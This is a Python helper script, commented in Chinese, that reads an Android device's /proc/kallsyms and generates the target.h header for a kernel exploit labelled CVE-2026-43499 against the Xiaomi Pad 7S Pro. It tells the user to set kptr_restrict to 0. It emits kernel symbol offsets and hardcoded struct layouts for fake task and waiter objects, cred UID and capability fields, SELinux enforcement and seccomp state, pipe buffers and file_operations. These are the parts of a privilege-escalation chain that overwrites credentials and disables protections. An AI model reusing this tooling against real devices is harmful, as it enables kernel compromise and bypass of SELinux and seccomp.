#!/usr/bin/env python3
"""
从 /proc/kallsyms 提取 CVE-2026-43499 exploit 所需的内核符号地址
用法:
  1. adb shell "cat /proc/kallsyms" > kallsyms.txt
  2. python3 gen_offsets.py kallsyms.txt
  3. 输出会生成正确的 target.h
"""
import sys
import re
import os

# 需要查找的符号列表
SYMBOLS = {
    # exploit 需要的核心符号
    'ASHMEM_MISC_FOPS_OFF': ['ashmem_misc_fops', 'misc_fops', 'ashmem_fops'],
    'ASHMEM_FOPS_OFF': ['ashmem_fops'],
    'ASHMEM_IOCTL_OFF': ['ashmem_ioctl', 'ashmem_ioctl_unlocked'],
    'ASHMEM_COMPAT_IOCTL_OFF': ['ashmem_compat_ioctl'],
    'ASHMEM_MMAP_OFF': ['ashmem_mmap'],
    'ASHMEM_OPEN_OFF': ['ashmem_open'],
    'ASHMEM_RELEASE_OFF': ['ashmem_release'],
    'ASHMEM_SHOW_FDINFO_OFF': ['ashmem_show_fdinfo'],
    'CONFIGFS_READ_ITER_OFF': ['configfs_read_iter'],
    'CONFIGFS_BIN_WRITE_ITER_OFF': ['configfs_bin_write_iter'],
    'COPY_SPLICE_READ_OFF': ['copy_splice_read'],
    'NOOP_LLSEEK_OFF': ['noop_llseek'],
    'INIT_TASK_OFF': ['init_task'],
    'INIT_UTS_NS_OFF': ['init_uts_ns'],
    'EMPTY_ZERO_PAGE_OFF': ['empty_zero_page'],
    'ROOT_TASK_GROUP_OFF': ['root_task_group'],
    'SELINUX_BLOB_SIZES_OFF': ['selinux_blob_sizes'],
    'SELINUX_ENFORCING_OFF': ['selinux_enforcing'],
    'SECURITY_HOOK_HEADS_OFF': ['security_hook_heads'],
    'KMALLOC_CACHES_OFF': ['kmalloc_caches'],
    'ANON_PIPE_BUF_OPS_OFF': ['anon_pipe_buf_ops'],
    # KASLR slide 相关
    'SLIDE_NFULNL_LOGGER_OFF': ['nfulnl_logger'],
    'SLIDE_LOGGERS_0_1_OFF': ['loggers'],
    'SLIDE_RANDOM_BOOT_ID_DATA_OFF': ['random_boot_id'],
    'SLIDE_SYSCTL_BOOTID_OFF': ['sysctl_bootid'],
}

# 可能的 KIMAGE_TEXT_BASE 值
KIMAGE_BASES = [
    0xffffffc008000000,  # 标准 ARM64 48-bit VA
    0xffffffc080000000,  # 部分 GKI 变体
]


def parse_kallsyms(filepath):
    """解析 /proc/kallsyms 或 System.map 格式
    kallsyms: 地址 类型 名称 [模块]
    System.map: 地址 类型 名称
    """
    symbols = {}
    with open(filepath, 'r') as f:
        for line in f:
            parts = line.strip().split()
            if len(parts) < 3:
                continue
            try:
                addr = int(parts[0], 16)
            except ValueError:
                continue
            sym_type = parts[1]
            sym_name = parts[2]
            # 去掉可能的模块名后缀
            if '[' in sym_name:
                sym_name = sym_name.split('[')[0]
            if addr > 0:
                symbols[sym_name] = addr
    return symbols


def detect_kimage_base(symbols):
    """从已知符号推断 KIMAGE_TEXT_BASE"""
    # init_task 通常在 .bss 段，地址较高
    init_task_addr = symbols.get('init_task', 0)
    if init_task_addr == 0:
        print("WARNING: init_task not found, using default KIMAGE_TEXT_BASE")
        return 0xffffffc008000000

    for base in KIMAGE_BASES:
        offset = init_task_addr - base
        # init_task offset 通常在 0x1000000-0x3000000 范围内
        if 0x1000000 < offset < 0x4000000:
            print(f"Detected KIMAGE_TEXT_BASE = 0x{base:x}")
            print(f"  (init_task offset = 0x{offset:x})")
            return base

    # 尝试通过页对齐推断
    # KIMAGE_TEXT_BASE 通常是 2MB 或 1GB 对齐
    for base in KIMAGE_BASES:
        if (init_task_addr & 0xFFFFFFFF00000000) == base:
            return base

    print(f"WARNING: Cannot determine KIMAGE_TEXT_BASE automatically")
    print(f"  init_task = 0x{init_task_addr:x}")
    print(f"  Using default 0xffffffc008000000")
    return 0xffffffc008000000


def main():
    if len(sys.argv) < 2:
        print("用法: python3 gen_offsets.py <kallsyms.txt>")
        print()
        print("获取 kallsyms.txt:")
        print('  adb shell "cat /proc/kallsyms" > kallsyms.txt')
        print('  # 如果输出全是0，先尝试: adb shell "echo 0 > /proc/sys/kernel/kptr_restrict"')
        sys.exit(1)

    filepath = sys.argv[1]
    if not os.path.exists(filepath):
        print(f"文件不存在: {filepath}")
        sys.exit(1)

    print(f"解析 {filepath} ...")
    symbols = parse_kallsyms(filepath)
    print(f"找到 {len(symbols)} 个符号")

    if not symbols or all(v == 0 for v in symbols.values()):
        print("ERROR: 没有找到有效符号地址！")
        print("可能原因: kptr_restrict=1 (需要root才能读取真实地址)")
        print("尝试: adb shell 'echo 0 > /proc/sys/kernel/kptr_restrict && cat /proc/kallsyms' > kallsyms.txt")
        sys.exit(1)

    kimage_base = detect_kimage_base(symbols)

    # 生成 offset
    offsets = {}
    found = 0
    missing = []

    for macro_name, candidates in SYMBOLS.items():
        offset = None
        for sym in candidates:
            if sym in symbols:
                addr = symbols[sym]
                offset = addr - kimage_base
                break

        if offset is not None:
            offsets[macro_name] = offset
            found += 1
        else:
            missing.append((macro_name, candidates))

    print(f"\n找到 {found}/{len(SYMBOLS)} 个符号偏移量")

    if missing:
        print(f"\n未找到的符号:")
        for macro_name, candidates in missing:
            print(f"  {macro_name}: 尝试了 {candidates}")

    # 输出 target.h
    output_path = os.path.join(os.path.dirname(__file__),
        'IonStack', 'CVE-2026-43499', 'exploit', 'src', 'targets',
        'violin-v-oss', 'target.h')

    # 也输出到当前目录
    for out in [output_path, 'target.h']:
        os.makedirs(os.path.dirname(out) if os.path.dirname(out) else '.', exist_ok=True)
        with open(out, 'w') as f:
            f.write(f"""#ifndef TARGET_H
#define TARGET_H

/*
 * Xiaomi Pad 7S Pro ("violin") - GKI 6.6.77-android15-8
 * Auto-generated from /proc/kallsyms
 * KIMAGE_TEXT_BASE = 0x{kimage_base:x}
 */

#define BUILD_VARIANT_LABEL "violin_gki_6.6.77"
#define BUILD_FINGERPRINT "Xiaomi/violin/violin:16/...:user/release-keys"

#define KIMAGE_TEXT_BASE 0x{kimage_base:x}ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0x80000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xffffff9000000000ULL
#define VMEMMAP_START 0xfffffffe00000000ULL

""")

            # 写入符号偏移量
            for macro_name in list(SYMBOLS.keys()) + ['SLIDE_INIT_TASK_OFF', 'SLIDE_ROOT_TASK_GROUP_OFF']:
                if macro_name in offsets:
                    f.write(f"#define {macro_name} 0x{offsets[macro_name]:08x}ULL\n")
                elif macro_name == 'SLIDE_INIT_TASK_OFF':
                    if 'INIT_TASK_OFF' in offsets:
                        f.write(f"#define {macro_name} INIT_TASK_OFF\n")
                    else:
                        f.write(f"#define {macro_name} 0x0ULL  /* NOT FOUND */\n")
                elif macro_name == 'SLIDE_ROOT_TASK_GROUP_OFF':
                    if 'ROOT_TASK_GROUP_OFF' in offsets:
                        f.write(f"#define {macro_name} ROOT_TASK_GROUP_OFF\n")
                    else:
                        f.write(f"#define {macro_name} 0x0ULL  /* NOT FOUND */\n")
                else:
                    f.write(f"#define {macro_name} 0x0ULL  /* NOT FOUND */\n")

            # 写入计算后的地址宏
            f.write("\n")
            addr_macros = [
                'ASHMEM_MISC_FOPS', 'ASHMEM_FOPS', 'ASHMEM_IOCTL',
                'ASHMEM_COMPAT_IOCTL', 'ASHMEM_MMAP', 'ASHMEM_OPEN',
                'ASHMEM_RELEASE', 'ASHMEM_SHOW_FDINFO',
                'CONFIGFS_READ_ITER', 'CONFIGFS_BIN_WRITE_ITER',
                'COPY_SPLICE_READ', 'NOOP_LLSEEK',
                'INIT_TASK', 'INIT_UTS_NS', 'EMPTY_ZERO_PAGE',
                'ROOT_TASK_GROUP', 'SELINUX_BLOB_SIZES',
                'SELINUX_ENFORCING', 'SECURITY_HOOK_HEADS',
                'KMALLOC_CACHES', 'ANON_PIPE_BUF_OPS',
            ]
            for name in addr_macros:
                off_name = f'{name}_OFF'
                if off_name in offsets:
                    f.write(f"#define {name} (KIMAGE_TEXT_BASE + {off_name})\n")

            # SLIDE macros
            slide_macros = [
                'SLIDE_NFULNL_LOGGER', 'SLIDE_LOGGERS_0_1',
                'SLIDE_RANDOM_BOOT_ID_DATA', 'SLIDE_INIT_TASK',
                'SLIDE_ROOT_TASK_GROUP', 'SLIDE_SYSCTL_BOOTID',
            ]
            f.write("\n")
            for name in slide_macros:
                off_name = f'{name}_OFF'
                image_name = f'{name}_IMAGE'
                if off_name in offsets:
                    f.write(f"#define {image_name} (KIMAGE_TEXT_BASE + {off_name})\n")
                elif name == 'SLIDE_INIT_TASK':
                    f.write(f"#define {image_name} (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)\n")
                elif name == 'SLIDE_ROOT_TASK_GROUP':
                    f.write(f"#define {image_name} (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)\n")

            # 写入固定的 struct 偏移量 (from GKI 6.6 analysis)
            f.write("""
/* Page payload layout */
#define LOCK_OFF 0x1350
#define W0_OFF 0x2220
#define FOPS_OFF 0x1000
#define SCRATCH_OFF 0x3000
#define RIGHT_OFF 0x4440
#define LEFT_OFF 0x5550
#define FAKE_TASK_OFF 0x3200

/* Waiter offsets */
#define WAITER_LOCAL_OFF 0x80
#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_WAKE_STATE_OFF 0x40
#define WAITER_PRIO_OFF 0x44
#define WAITER_DEADLINE_OFF 0x48
#define WAITER_WW_CTX_OFF 0x50

/* Fake waiter offsets */
#define FAKE_WAITER_TREE_PRIO_OFF 0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF 0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF 0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF 0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF 0x50
#define FAKE_WAITER_LOCK_OFF 0x58
#define FAKE_WAITER_WAKE_STATE_OFF 0x60
#define FAKE_WAITER_WW_CTX_OFF 0x68

/* Fake task struct offsets */
#define FAKE_TASK_USAGE_OFF 0x40
#define FAKE_TASK_PRIO_OFF 0x84
#define FAKE_TASK_NORMAL_PRIO_OFF 0x8c
#define FAKE_TASK_TASK_GROUP_OFF 0x348
#define FAKE_TASK_PI_LOCK_OFF 0x90c
#define FAKE_TASK_PI_WAITERS_OFF 0x920
#define FAKE_TASK_PI_TOP_TASK_OFF 0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x938

/* ConfigFS */
#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

/* mm_struct */
#define MM_OWNER_OFF 1032

/* task_struct field offsets (GKI 6.6) */
#define TASK_PID_OFF 0x618
#define TASK_TGID_OFF 0x61c
#define TASK_REAL_PARENT_OFF 0x628
#define TASK_ATOMIC_FLAGS_OFF 0x5d8
#define TASK_REAL_CRED_OFF 0x818
#define TASK_CRED_OFF 0x820
#define TASK_COMM_OFF 0x830
#define TASK_TASKS_OFF 0x550
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x8e8

/* cred struct (GKI 6.6, CONFIG_KEYS=y) */
#define CRED_UID_OFF 8
#define CRED_SECUREBITS_OFF 40
#define CRED_CAPS_OFF 48
#define CRED_SECURITY_OFF 128

/* SELinux cred */
#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4

/* Seccomp */
#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08
#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

/* struct page */
#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x08
#define STRUCT_PAGE_TYPE_OFF 0x30

/* pipe_buffer */
#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

/* pipe_inode_info (GKI 6.6) */
#define PIPE_INODE_INFO_STRUCT_SIZE 0xb8
#define PIPE_INODE_INFO_SIZE 0xc0
#define PIPE_INODE_INFO_SLOTS_PER_PAGE 21
#define PIPE_HEAD_OFF 0x60
#define PIPE_TAIL_OFF 0x64
#define PIPE_MAX_USAGE_OFF 0x68
#define PIPE_RING_SIZE_OFF 0x6c
#define PIPE_NR_ACCOUNTED_OFF 0x70
#define PIPE_READERS_OFF 0x74
#define PIPE_WRITERS_OFF 0x78
#define PIPE_FILES_OFF 0x7c
#define PIPE_TMP_PAGE_OFF 0x90
#define PIPE_BUFS_OFF 0xa8
#define PIPE_USER_OFF 0xb0

/* file_operations (GKI 6.6) */
#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x48
#define FOPS_COMPAT_IOCTL_OFF 0x50
#define FOPS_MMAP_OFF 0x58
#define FOPS_OPEN_OFF 0x68
#define FOPS_RELEASE_OFF 0x78
#define FOPS_SPLICE_READ_OFF 0xb8
#define FOPS_SHOW_FDINFO_OFF 0xd8

#endif
""")

    print(f"\ntarget.h 已生成:")
    print(f"  {os.path.abspath(out)}")
    if output_path != out and os.path.exists(output_path):
        print(f"  {output_path}")

    if missing:
        print(f"\n⚠ {len(missing)} 个符号未找到，需要手动补充:")
        for macro_name, candidates in missing:
            print(f"  {macro_name}: 在 kallsyms 中搜索 {candidates}")


if __name__ == '__main__':
    main()
